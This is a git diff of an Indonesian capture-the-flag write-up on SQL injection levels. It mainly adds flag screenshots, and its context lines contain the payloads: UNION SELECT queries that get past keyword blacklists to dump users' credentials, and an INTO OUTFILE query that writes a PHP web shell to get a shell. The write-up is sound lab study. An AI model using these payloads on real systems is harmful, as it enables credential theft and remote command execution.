@@ -424,7 +424,7 @@ Singkat cerita jadi itu yang di blacklist adalah "UNION,union,SELECT,SELECT" seh
 
 `3' UNiON SElECT concat(username,password),1,1 from users#`
 
-![](/images/flag-sqli-lv4.png)
+![](/images/lvl4-sqli-flag.png)
 
 ### Level 5
 
@@ -442,6 +442,8 @@ if (isset($_GET['q'])) {
 ada beberapa trik yang bisa di gunakan untuk menggantikan space di SQL contohya `/**/` kita mengunakan komentar untuk mengantikan spasi. dengan menggunakan cara yang sama dengan level sebelumnya kita bisa mendapatkan flagnya
 
 `'/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secret#`
+
+![](/images/sqli-lv5-flag.png)
 
 ### Level 6
 
@@ -479,9 +481,13 @@ Setelah di enumurasi ternyata beberapa keyword di blacklist, seperti : **Union,S
 >
 > There's only one way to find out : let's pop a shell.
 
-
-
 `4444+union+select+null,"<?php%20system($_GET[\"cmd\"]);?>"%20INTO%20OUTFILE%20"/var/www/html/uploads/lala.php"#`
 
-disini kita bisa menggunakan into outfile untuk menulis file backdoor ke folder uploads 
+disini kita bisa menggunakan into outfile untuk menulis file backdoor ke folder uploads
+
+![](/images/rce-sqli-lv8.png)Dan kita menemukan secret folder **secret\_level8\_folder\_you\_wont\_be\_able\_to\_guess\_without\_actually\_getting\_a\_shell**
+
+![](/images/secret-folder-sqli-lv8.png)kemudian kita mendapatkan flagnya 
+
+![](/images/flag-sqli-lv8.png)
 
